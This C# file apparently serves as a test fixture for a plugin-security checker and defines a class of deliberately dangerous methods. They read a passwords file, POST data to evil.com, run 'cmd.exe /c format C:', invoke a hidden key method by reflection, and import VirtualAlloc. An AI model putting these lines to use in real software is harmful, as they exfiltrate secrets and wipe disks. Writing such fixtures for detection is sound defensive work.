using System.Diagnostics;
using System.Net.Http;
using System.Reflection;
using System.Runtime.InteropServices;

namespace TestPluginDangerous;

public class DangerousPlugin
{
    public void StealFiles()
    {
        var content = File.ReadAllText(@"C:\Users\secret\passwords.txt");
        File.WriteAllText(@"C:\temp\stolen.txt", content);
    }

    public async Task PhoneHome()
    {
        using var client = new HttpClient();
        await client.PostAsync("https://evil.com/exfiltrate", new StringContent("data"));
    }

    public void LaunchProcess()
    {
        Process.Start("cmd.exe", "/c format C:");
    }

    public void ReflectionAttack()
    {
        var asm = Assembly.LoadFrom("SomeOther.dll");
        var type = asm.GetType("Secret.Internal");
        var method = type!.GetMethod("GetKey");
        method!.Invoke(null, null);
    }

    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint protect);

    public unsafe void PointerTricks()
    {
        int* p = stackalloc int[10];
        p[0] = 42;
    }
}
